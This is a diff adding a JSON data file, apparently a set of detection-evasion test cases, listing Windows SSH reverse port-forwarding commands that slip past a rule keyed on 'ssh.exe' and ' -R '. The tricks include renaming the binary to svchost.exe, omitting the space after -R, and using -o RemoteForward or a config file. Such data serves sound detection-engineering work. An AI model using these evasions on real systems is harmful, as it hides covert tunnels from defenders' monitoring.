@@ -1,0 +1,30 @@
+[
+  {
+    "output": "ssh.exe -F ssh_config_with_forwarding.txt user@target",
+    "explanation": "This approach bypasses the command line detection entirely by placing the 'RemoteForward' directive inside a custom SSH configuration file. The '-F' flag is used to specify this file, meaning the forwarding activity occurs without any forwarding-related flags appearing in the process command line arguments."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\OpenSSH\\ssh.exe C:\\Temp\\svchost.exe && C:\\Temp\\svchost.exe -R 8080:localhost:80 user@10.10.10.10",
+    "explanation": "Bypasses the 'Image|endswith: \\ssh.exe' detection logic by renaming the SSH executable to something else before running the reverse port forwarding command."
+  },
+  {
+    "output": "ssh.exe -R8080:localhost:80 user@10.10.10.10",
+    "explanation": "Bypasses the 'CommandLine|contains|windash: \\' -R \\'' logic. The rule explicitly expects a trailing space after the -R flag, but OpenSSH accepts the port configuration immediately following the flag without a space."
+  },
+  {
+    "output": "ssh.exe -o \"RemoteForward 8080 localhost:80\" user@10.10.10.10",
+    "explanation": "Bypasses the command line check by avoiding the '-R' flag entirely. Using the '-o' flag with the 'RemoteForward' directive achieves the exact same reverse port forwarding functionality."
+  },
+  {
+    "output": "C:\\Windows\\System32\\OpenSSH\\ssh.exe -R2222:localhost:22 user@remote-host",
+    "explanation": "The original rule looks for ' -R ' with spaces. By removing the space between the flag and the port configuration (e.g., -R2222), the 'contains|windash' condition fails to match while the command remains functionally valid for SSH."
+  },
+  {
+    "output": "ssh -o \"RemoteForward 2222 localhost:22\" user@remote-host",
+    "explanation": "Instead of using the -R flag, the rule can be bypassed by using the '-o' flag to specify the 'RemoteForward' configuration option directly. The rule only monitors for the shorthand flag and ignores the configuration equivalent."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\OpenSSH\\ssh.exe C:\\Users\\Public\\not_ssh.exe && C:\\Users\\Public\\not_ssh.exe -R 2222:localhost:22 user@remote-host",
+    "explanation": "The rule filters specifically for images ending in '\\ssh.exe'. By renaming the binary to anything else, the process creation event will no longer trigger the 'Image' selection criteria."
+  }
+]
